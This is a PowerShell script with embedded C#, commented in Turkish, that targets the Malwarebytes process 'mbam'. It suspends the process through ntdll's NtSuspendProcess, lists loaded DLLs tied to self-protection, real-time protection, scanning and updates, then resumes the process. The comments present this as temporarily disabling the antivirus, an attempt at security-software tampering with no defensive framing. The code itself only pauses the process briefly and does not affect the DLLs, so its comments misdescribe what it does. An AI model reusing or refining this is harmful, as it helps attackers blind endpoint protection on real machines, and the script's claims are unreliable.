# -------------------------------
# C# kodunu inline ekleme
# -------------------------------
$source = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class ProcessHelper
{
    [DllImport(""ntdll.dll"")]
    public static extern uint NtSuspendProcess(IntPtr processHandle);

    [DllImport(""ntdll.dll"")]
    public static extern uint NtResumeProcess(IntPtr processHandle);

    public static void SuspendResumeCriticalDlls(string processName, string[] criticalDlls)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if(processes.Length == 0)
        {
            Console.WriteLine($""Process {processName} bulunamadi!"");
            return;
        }

        Process target = processes[0];
        IntPtr hProcess = target.Handle;

        // Suspend process -> DLL’lerin geçici olarak iletişimini kes
        NtSuspendProcess(hProcess);
        Console.WriteLine($""Process {processName} durduruldu. Critical DLL’ler geçici olarak etkisiz."");

        // Loaded Modules listesi
        foreach(ProcessModule module in target.Modules)
        {
            if(Array.Exists(criticalDlls, d => d.Equals(module.ModuleName, StringComparison.OrdinalIgnoreCase)))
            {
                Console.WriteLine($""Critical DLL loaded: {module.ModuleName}"");
                // Burada sadece mantıksal iletişim kesiliyor; memory’ye dokunulmuyor
            }
        }

        // Resume process -> process tekrar çalışsın, DLL’ler yeniden aktif
        NtResumeProcess(hProcess);
        Console.WriteLine($""Process {processName} tekrar çalıştırıldı."");
    }
}
"@

# -------------------------------
# C# kodunu derle
# -------------------------------
Add-Type -TypeDefinition $source -Language CSharp

# -------------------------------
# PowerShell üzerinden target process ve critical DLL listesi
# -------------------------------
$targetProcessName = "mbam"
$criticalDlls = @(
    "MBAMCore.dll","MBAMShim.dll","SelfProtectionSdk.dll","RtpShim.dll",
    "ScanControllerImpl.dll","AeShim.dll","Actions.dll","ArwControllerImpl.dll",
    "BrowserSDKDLL.dll","TelemetryControllerImpl.dll","UpdateControllerImpl.dll"
)

# -------------------------------
# Fonksiyonu çağır
# -------------------------------
[ProcessHelper]::SuspendResumeCriticalDlls($targetProcessName, $criticalDlls)

